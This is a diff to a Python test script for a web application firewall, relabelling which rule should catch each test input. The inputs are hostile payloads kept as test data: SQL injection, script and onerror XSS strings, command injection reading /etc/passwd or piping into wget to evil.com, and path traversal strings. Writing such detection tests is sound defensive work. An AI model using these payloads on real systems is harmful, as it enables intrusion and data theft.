@@ -11,14 +11,14 @@ print("=== Rules loaded:", list(MODSEC_RULES.keys()))
 engine = WafEngine()
 
 tests = [
-    ("SELECT * FROM users WHERE id=1", "SQL_Injection"),
-    (" ' OR 1=1 --", "SQL_Injection"),
-    ("<script>alert(1)</script>", "XSS_Attack"),
-    ('"><img src=x onerror=alert(1)>', "XSS_Attack"),
-    ("hello; cat /etc/passwd", "OS_Command_Injection"),
-    ("input | wget http://evil.com", "OS_Command_Injection"),
-    ("../../etc/passwd", "Path_Traversal"),
-    ("..\\..\\boot.ini", "Path_Traversal"),
+    ("SELECT * FROM users WHERE id=1", "OWASP_SQLi"),
+    (" ' OR 1=1 --", "OWASP_SQLi"),
+    ("<script>alert(1)</script>", "OWASP_XSS"),
+    ('"><img src=x onerror=alert(1)>', "OWASP_XSS"),
+    ("hello; cat /etc/passwd", "OWASP_LFI"),
+    ("input | wget http://evil.com", "OWASP_RCE"),
+    ("../../etc/passwd", "OWASP_LFI"),
+    ("..\\..\\boot.ini", "OWASP_LFI"),
     ("Hello, this is a safe message.", None),
     ("What is 1+1?", None),
 ]
